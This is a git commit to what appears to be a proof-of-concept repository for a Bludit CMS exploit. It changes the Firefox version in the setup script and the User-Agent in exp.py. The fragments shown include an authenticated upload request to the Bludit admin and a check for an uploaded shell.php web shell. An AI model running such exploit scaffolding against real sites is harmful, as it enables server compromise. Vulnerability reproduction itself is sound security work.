c4009250e5a8e66b4a3d5f51b58d8d9b75485668
zzxin107 <972844082@qq.com>
2020-05-18 11:03:56 +0800

    更改firefox版本

--- poc/exp.py
+++ poc/exp.py
@@ -37,7 +37,7 @@ def exp(host, token, cookie_b):
         'BLUDIT-KEY': cookie_b
     }
     headers = {
-        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0',
+        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0',
         'Content-Type': 'multipart/form-data; boundary=--------327107347321150223463725464476',
         'Origin': host,
         'Referer': host + '/admin/new-content',
--- poc/poc.sh
+++ poc/poc.sh
@@ -4,7 +4,13 @@ chmod +x geckodriver
 cp geckodriver /usr/local/bin/ 
 echo "start"
 firefox --version
+tar -xjf firefox-75.0.tar.bz2
+sudo mv firefox-75.0 /opt/firefox-75.0
+sudo mv /usr/bin/firefox /usr/bin/firefox-old
+sudo ln -s /opt/firefox-75.0/firefox /usr/bin/firefox
+firefox --version
 sleep 10
-python3 /opt/poc/exp.py http://web 
+python3 /opt/poc/exp.py http://web
+
 curl http://web/bl-content/tmp/shell.php
 echo "poc ok"
